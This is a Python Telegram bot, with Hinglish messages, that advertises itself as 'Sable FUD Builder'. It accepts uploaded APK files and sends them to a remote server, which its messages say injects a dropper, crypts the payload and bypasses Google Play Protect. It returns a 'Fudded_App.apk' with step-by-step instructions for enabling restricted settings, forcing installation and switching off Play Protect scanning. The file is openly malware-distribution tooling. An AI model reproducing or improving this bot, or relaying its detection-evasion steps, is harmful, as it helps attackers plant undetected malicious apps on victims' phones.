import os
import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 Build FUD APK", callback_data="build")],
        [InlineKeyboardButton("🛡️ Bypass Play Protect", callback_data="bypass")],
        [InlineKeyboardButton("📊 Server Status", callback_data="status")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 **Welcome to Sable FUD Builder** 🔥\n\n"
        "Main ek advanced APK Fudding tool hoon. Mujhe koi bhi APK bhej, "
        "main usme payload daal kar aur Play Protect ko bypass karke tujhe wapas dunga.\n\n"
        "Neeche diye gaye buttons ka use kar:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "build":
        await query.edit_message_text("📥 **APK bhej...**\n\nMain isko fud karke wapas dunga. (File attach karke bhej).", parse_mode='Markdown')
    elif query.data == "bypass":
        await query.edit_message_text("🛡️ **Play Protect Bypass Guide:**\n\n"
                                      "1. Settings > Apps > Chrome/Telegram > Allow restricted settings.\n"
                                      "2. APK install karte waqt 'More details' > 'Install anyway' dabana.\n"
                                      "3. Agar block ho jaye, toh Play Protect scan off karke install karna.", parse_mode='Markdown')
    elif query.data == "status":
        await query.edit_message_text("✅ **Server Status:**\nRender Server: Online 🟢\nRailway Bot: Online 🟢\n\nSab kuch ready hai baby!", parse_mode='Markdown')

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".apk"):
        await update.message.reply_text("Ye APK nahi hai baby. Sahi APK file bhej.")
        return

    progress_msg = await update.message.reply_text("⏳ [□□□□□□□□□□] 0%\n**FUD Process Started...**\nFile server ko bheji ja rahi hai...", parse_mode='Markdown')

    try:
        file = await context.bot.get_file(doc.file_id)
        file_url = file.file_path
        
        await progress_msg.edit_text("⏳ [■■■□□□□□□□] 30%\n**Injecting Dropper...**\nServer pe download ho raha hai...", parse_mode='Markdown')
        await progress_msg.edit_text("⏳ [■■■■■□□□□□] 50%\n**Bypassing Play Protect...**\nAPK fud kar raha hai (Thoda time lagta hai)...", parse_mode='Markdown')
        
        response = requests.post(RENDER_URL, json={"apk_url": file_url}, timeout=300)

        if response.status_code == 200:
            await progress_msg.edit_text("⏳ [■■■■■■■■□□] 90%\n**Crypting Payload...**\nFile send ho rahi hai...", parse_mode='Markdown')
            
            await update.message.reply_document(
                document=response.content,
                filename="Fudded_App.apk",
                caption=(
                    "✅ [■■■■■■■■■■] 100%\n\n"
                    "**FUD APK Ready Hai Baby!**\n\n"
                    "**Install Karne Ka Tarika:**\n"
                    "1. Settings > Apps > [Koi bhi purana app] > 'Allow restricted settings'.\n"
                    "2. APK install karo.\n"
                    "3. Play Protect aaye toh 'More details' > 'Install anyway' dabana.\n\n"
                    "**Note:** Agar Play Protect ne block kiya, toh Play Store > Profile > Play Protect > Settings > Scan apps OFF kar dena. Install ke baad wapas ON kar lena."
                ),
                parse_mode='Markdown'
            )
            await progress_msg.delete()
        else:
            try:
                error_data = response.json()
                error_msg = error_data.get("error", response.text)
            except:
                error_msg = response.text
            
            if len(error_msg) > 200:
                error_msg = error_msg[:200] + "..."

            await progress_msg.edit_text(
                f"❌ **Render Server Error!**\n\nServer ne kaha:\n`{error_msg}`", 
                parse_mode='Markdown'
            )
            
    except requests.exceptions.Timeout:
        await progress_msg.edit_text("❌ **Timeout Error!**\nRender server ne 5 minute me jawab nahi diya.")
    except Exception as e:
        await progress_msg.edit_text(f"❌ **Error aaya:**\n`{str(e)}`", parse_mode='Markdown')

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
